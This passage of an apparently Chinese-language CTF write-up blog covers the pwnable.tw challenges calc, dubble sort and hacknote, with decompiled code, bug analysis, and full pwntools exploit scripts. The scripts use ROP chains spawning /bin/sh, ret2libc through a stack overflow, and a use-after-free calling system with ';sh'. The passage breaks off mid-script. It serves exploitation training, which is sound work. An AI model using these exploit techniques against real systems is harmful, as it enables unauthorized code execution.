!*(_BYTE *)(i + a1) )</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( O &gt;= 0 )</span><br><span class="line">    eval(a2, s[O--]);</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func eval():</span><br><span class="line"></span><br><span class="line">_DWORD *__cdecl eval(_DWORD *a1, char a2)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; // eax</span><br><span class="line"></span><br><span class="line">  if ( a2 == &apos;+&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[*a1 - 1] += a1[*a1];</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( a2 &gt; &apos;+&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a2 == &apos;-&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[*a1 - 1] -= a1[*a1];</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( a2 == &apos;/&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[*a1 - 1] /= a1[*a1];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( a2 == &apos;*&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[*a1 - 1] *= a1[*a1];</span><br><span class="line">  &#125;</span><br><span class="line">  result = a1; </span><br><span class="line">  --*a1;</span><br><span class="line">  return result;                             // 每一次计算的结果储存在 a1[1]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>  看上去比较杂乱，看了好久也没找到漏洞。。。分析一波大佬们的思路。</p><p>  程序中将a1[0] 存放操作数数目， a1[1,2…]后面存放操作数<br>  用num来表示a1</p><p>  则eval函数的逻辑就是这样：双目运算符，num[0] = 2,所以计算 a+b 逻辑便是：<br>  num[num[0] - 1] = num [2 - 1 ]= num[num[0] - 1] + num[ num[0] ] = num[2-1] + num[2]</p><p>  看样子没什么问题，但是假如直接输入比如说 +100， num[0] = 1 ,num[1] = 100<br>  num[num[0] - 1] = num [1 -1 ] = num[0] = num[num[0] - 1] + num[num[0]] = 1 + 100 = 101</p><p>  可以看出来num[0]的值被改变了，而程序最后输出是输出num[num[0]-1]的值，在这里也就是输出num[101 -1] = num [100]<br>  也就可以泄露栈内存了！！</p><p>  第二步，假如输入 +100+12，计算逻辑便是：<br>  num[num[0] - 1] = num [100] = num[num[0] - 1] + num[num[0]] = num[100] + num[101] = num[350] + 12    //为什么12会在num[101]处</p><p>  总之，这样子便能对任意栈地址写了！！</p><p>  由于每次计算都会对calc的栈区清零（bzero函数），所以我们要写到其他地方栈区，比如说，main函数的返回地址。（直接写以绕过canary）</p><p>  因为输入输出什么的都是数字，所以系统调用最为明智。</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><p>!!!发现了神器!!!很早之前听说过的ropchain，没有在意，没想到，太可怕了！！！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./calc&apos;)</span><br><span class="line">bin = ELF(&apos;./calc&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;, 10100)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">!!!!     ROPgadget --binary ./calc  --ropchain     !!!!直接生成完整的rop链，简直不要太可怕</span><br><span class="line"></span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line"># Padding goes here</span><br><span class="line">p = &apos;&apos;</span><br><span class="line">p+=p32(0x804967a)</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # @ .data</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0805c34b) # pop eax ; ret</span><br><span class="line">p += &apos;/bin&apos;</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec064) # @ .data + 4</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0805c34b) # pop eax ; ret</span><br><span class="line">p += &apos;//sh&apos;</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080550d0) # xor eax, eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0809b30d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080481d1) # pop ebx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # @ .data</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701d1) # pop ecx ; pop ebx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec060) # padding without overwrite ebx</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080701aa) # pop edx ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080ec068) # @ .data + 8</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x080550d0) # xor eax, eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x0807cb7f) # inc eax ; ret</span><br><span class="line">p += pack(&apos;&lt;I&apos;, 0x08049a21) # int 0x80</span><br><span class="line"></span><br><span class="line">for i in range(len(p)/4-1):</span><br><span class="line">    sh.sendline(&apos;+&apos;+str(369+i)+&apos;-&apos;+str(u32(p[i*4:i*4+4]))+&apos;+&apos;+str(u32(p[i*4+4:i*4+8])))</span><br><span class="line"></span><br><span class="line">sh.sendline(&apos;&apos;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">$ whoami</span><br><span class="line">calc</span><br></pre></td></tr></table></figure><p>下面这个是相对正常的exp。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p=remote(&apos;chall.pwnable.tw&apos;,10100)</span><br><span class="line">#p=process(&quot;./calc&quot;)</span><br><span class="line">key=[0x0805c34b,11,0x080701d1,0,0,0x08049a21,0x6e69622f,0x0068732f]</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&apos;+360&apos;)</span><br><span class="line">addr_bp=int(p.recv())</span><br><span class="line">addr_re=((addr_bp+0x100000000)&amp;0xFFFFFFF0)-16</span><br><span class="line">addr_str=addr_re+20-0x100000000</span><br><span class="line">addr=361</span><br><span class="line">for i in range(5):</span><br><span class="line">      p.sendline(&apos;+&apos;+str(addr+i))</span><br><span class="line">      ans=int(p.recv())</span><br><span class="line">      if key[i]&lt;ans:</span><br><span class="line">             ans=ans-key[i]</span><br><span class="line">             p.sendline(&apos;+&apos;+str(addr+i)+&apos;-&apos;+str(ans))</span><br><span class="line">      else:</span><br><span class="line">          ans=key[i]-ans</span><br><span class="line">          p.sendline(&apos;+&apos;+str(addr+i)+&apos;+&apos;+str(ans))</span><br><span class="line">      p.recv()</span><br><span class="line">p.sendline(&apos;+&apos;+&apos;365&apos;+str(addr_str))</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(5,8):</span><br><span class="line">      p.sendline(&apos;+&apos;+str(addr+i))</span><br><span class="line">      ans=int(p.recv())</span><br><span class="line">      if key[i]&lt;ans:</span><br><span class="line">             ans=ans-key[i]</span><br><span class="line">             p.sendline(&apos;+&apos;+str(addr+i)+&apos;-&apos;+str(ans))</span><br><span class="line">      else:</span><br><span class="line">          ans=key[i]-ans</span><br><span class="line">          p.sendline(&apos;+&apos;+str(addr+i)+&apos;+&apos;+str(ans))</span><br><span class="line">      p.recv()</span><br><span class="line">p.send(&apos;kirin&apos;+&apos;\n&apos;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ whoami</span><br><span class="line">calc</span><br></pre></td></tr></table></figure><h1 id="dubble-sort"><a href="#dubble-sort" class="headerlink" title="dubble sort"></a>dubble sort</h1><p>冒泡排序，小小的漏洞，简直就是课设车祸现场hhh<br>只找到了第一个漏洞，泄露下地址，然后gg</p><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  int *v4; // edi</span><br><span class="line">  unsigned int v5; // esi</span><br><span class="line">  unsigned int v6; // esi</span><br><span class="line">  int v7; // ST08_4</span><br><span class="line">  int result; // eax</span><br><span class="line">  unsigned int num; // [esp+18h] [ebp-74h]</span><br><span class="line">  int v10; // [esp+1Ch] [ebp-70h]</span><br><span class="line">  char buf; // [esp+3Ch] [ebp-50h]</span><br><span class="line">  unsigned int canary; // [esp+7Ch] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  canary = __readgsdword(0x14u);</span><br><span class="line">  sub_8B5();</span><br><span class="line">  __printf_chk(1, (int)&quot;What your name :&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x40u);                        // 没有截断，泄露libc基地址</span><br><span class="line">  __printf_chk(1, (int)&quot;Hello %s,How many numbers do you what to sort :&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%u&quot;, &amp;num);                    //没有限制输入个数，之后能栈溢出   </span><br><span class="line">  v3 = num;</span><br><span class="line">  if ( num )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = &amp;v10;</span><br><span class="line">    v5 = 0;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(1, (int)&quot;Enter the %d number : &quot;);  </span><br><span class="line">      fflush(stdout);</span><br><span class="line">      __isoc99_scanf(&quot;%u&quot;, v4);</span><br><span class="line">      ++v5;</span><br><span class="line">      v3 = num;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( num &gt; v5 );</span><br><span class="line">  &#125;                                             // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">  dubblesort((unsigned int *)&amp;v10, v3);         // 出人意料的没有漏洞。。。。</span><br><span class="line">                                                // </span><br><span class="line">  puts(&quot;Result :&quot;);                             // print</span><br><span class="line">  if ( num )                                    </span><br><span class="line">  &#123;</span><br><span class="line">    v6 = 0;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *(&amp;v10 + v6);</span><br><span class="line">      __printf_chk(1, (int)&quot;%u &quot;);</span><br><span class="line">      ++v6;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( num &gt; v6 );</span><br><span class="line">  &#125;                                             // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">  result = 0;</span><br><span class="line">  if ( __readgsdword(0x14u) != canary )</span><br><span class="line">    process_end();</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>刚开始输入name，然后会将其打印出来，因为read没有\x00截断，所以可以泄露出栈内存泄露libc基地址。</p><p>之后在输入个数时scanf不会限制个数，所以之后排完序后会栈溢出，但是因为程序有canary保护，不知道怎么利用。</p><p>大概是因为canary &lt; system_addr &lt; binsh_addr 所以试图让排序后的canary仍然不变，system覆盖返回地址，之后在有个/bin/sh</p><p>整体思路便是ret2libc</p><p>他们不知道怎么发现的如果在排序的时候输入 +  会输出栈的内容且不退出，只知道输入abc这些字符会直接输出栈内容并退出<br>。。。之前输出的数据一直很少，没发现。。</p><p>ps:新的寻找/bin/sh的方法！！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C ./libc_32.so.6|grep  /bin  -A 1</span><br></pre></td></tr></table></figure></p><p><em>而且之前的gdb还是有问题的，attach会直接终结进程，之后会找个法子用ida调试，那样子会舒服不少。</em></p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><p>先把大佬的放上来吧。。之后自己调成功了再放自己的。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">got_off = 0x1b0000</span><br><span class="line">system_off = 0x3a940</span><br><span class="line">bin_sh_off = 0x158e8b</span><br><span class="line"> </span><br><span class="line">p = remote(&quot;chall.pwnable.tw&quot;,10101)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&apos;a&apos;*24)</span><br><span class="line">got_addr = u32(p.recv()[30:34])-0xa</span><br><span class="line">libc_addr = got_addr-got_off</span><br><span class="line">system_addr = libc_addr + system_off</span><br><span class="line">bin_sh_addr = libc_addr + bin_sh_off</span><br><span class="line">p.sendline(&apos;35&apos;)</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(24):</span><br><span class="line">    p.sendline(&apos;0&apos;)</span><br><span class="line">    p.recv()</span><br><span class="line">p.sendline(&apos;+&apos;)</span><br><span class="line">p.recv()</span><br><span class="line">for i in range(9):</span><br><span class="line">    p.sendline(str(system_addr))</span><br><span class="line">    p.recv()</span><br><span class="line">p.sendline(str(bin_sh_addr))</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考：<a href="https://bbs.pediy.com/thread-228226.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-228226.htm</a></p><h1 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h1><p>看着好生熟悉，看了下题目，感觉是之前的UAF的题，回去看了下，果然是hhhhh，不过这次多给了个libc，去掉了之前的之前打印flag的函数、</p><h2 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h2><p>三个功能，添加，打印，删除、</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">unsigned int add()</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v0; // ebx</span><br><span class="line">  signed int i; // [esp+Ch] [ebp-1Ch]</span><br><span class="line">  int size; // [esp+10h] [ebp-18h]</span><br><span class="line">  char buf; // [esp+14h] [ebp-14h]</span><br><span class="line">  unsigned int v5; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);</span><br><span class="line">  if ( idx &lt;= 5 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 4; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !ptr[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr[i] = malloc(8u);                    // ptr[i]  *ptr</span><br><span class="line">                                                // </span><br><span class="line">        if ( !ptr[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)ptr[i] = sub_804862B;        // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">        printf(&quot;Note size :&quot;);</span><br><span class="line">        read(0, &amp;buf, 8u);</span><br><span class="line">        size = atoi(&amp;buf);</span><br><span class="line">        v0 = ptr[i];</span><br><span class="line">        v0[1] = malloc(size);</span><br><span class="line">        if ( !*((_DWORD *)ptr[i] + 1) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;                                       // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">                                                // </span><br><span class="line">        printf(&quot;Content :&quot;);</span><br><span class="line">        read(0, *((void **)ptr[i] + 1), size);</span><br><span class="line">        puts(&quot;Success !&quot;);</span><br><span class="line">        ++idx;</span><br><span class="line">        return __readgsdword(0x14u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Full&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unsigned int print()</span><br><span class="line">&#123;</span><br><span class="line">  int idx; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf; // [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  idx = atoi(&amp;buf);</span><br><span class="line">  if ( idx &lt; 0 || idx &gt;= ::idx )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( ptr[idx] )</span><br><span class="line">    (*(void (__cdecl **)(void *))ptr[idx])(ptr[idx]);</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned int sub_80487D4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf; // [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;= idx )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*((void **)ptr[v1] + 1));              // ptr[v1] puts指针</span><br><span class="line">                                                // ptr[v1]+1 content指针</span><br><span class="line">    free(ptr[v1]);                              // uaf</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p>add 函数会分配大小为8的内存块存放puts与content的指针，因为free之后没有将其指向null，所以可以利用uaf漏洞<br>覆盖note0的指针，将其指向某got地址，print泄露真实地址，计算得到system真实地址<br>再次修改其为system地址，需要使用参数截断—system的参数即为结构体本身<br>这里需要使用system的参数截断，例如  “||sh”或者”;sh”</p><p><em>感觉正在用着残破不堪的工具。。要完了</em></p><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">      sh.recvuntil(&quot;choice :&quot;)</span><br><span class="line">      sh.sendline(&quot;1&quot;)</span><br><span class="line">      sh.recvuntil(&quot;size :&quot;)</span><br><span class="line"></span><br><span class="line">      sh.sendline(size)</span><br><span class="line">      sh.recvuntil(&quot;Content :&quot;)</span><br><span class="line">      sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">      sh.recvuntil(&quot;choice :&quot;) </span><br><span class="line">      sh.sendline(&quot;2&quot;) </span><br><span class="line">      sh.recvuntil(&quot;Index :&quot;) </span><br><span class="line">      sh.sendline(index) </span><br><span class="line"></span><br><span class="line">def print(index): </span><br><span class="line">    sh.recvuntil(&quot;choice :&quot;) </span><br><span class="line">    sh.sendline(&quot;3&quot;) </span><br><span class="line">    sh.recvuntil(&quot;Index :&quot;) </span><br><span class="line">    sh.sendline(index)</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./hacknote&apos;)</span><br><span class="line">sh = remote(&quot;chall.pwnable.tw&quot;, 10102)</span><br><span class="line">elf=ELF(&quot;./hacknote&quot;)</span><br><span class="line">libc=ELF(&quot;./libc_32.so.6&quot;)</span><br><span class="line"></span><br><span class="line">read_got=elf.got[&quot;read&quot;]</span><br><span class="line">putnote=0x804862b</span><br><span class="line"></span><br><span class="line">add(&quot;16&quot;,15*&quot;a&quot;)</span><br><span class="line">add(&quot;16&quot;,15*&quot;a&quot;)</span><br><span class="line">delete(&apos;0&apos;)</span><br><span class="line">delete(&apos;1&apos;)</span><br><span class="line"></span><br><span class="line">add(&apos;8&apos;,p32(putnote)+p32(read_got))</span><br><span class="line">print(&apos;0&apos;) </span><br><span class="line">read_addr=u32(sh.recv()[:4])</span><br><span class="line">print hex(read_addr)</span><br><span class="line"></span><br><span class="line">sys_addr=read_addr-libc.symbols[&quot;read&quot;]+libc.symbols[&quot;system&quot;] </span><br><span class="line">delete(&apos;2&apos;) </span><br><span class="line">add(&apos;8&apos;,p32(sys_addr)+&quot;;sh\x00&quot;)</span><br><span class="line"></span><br><span 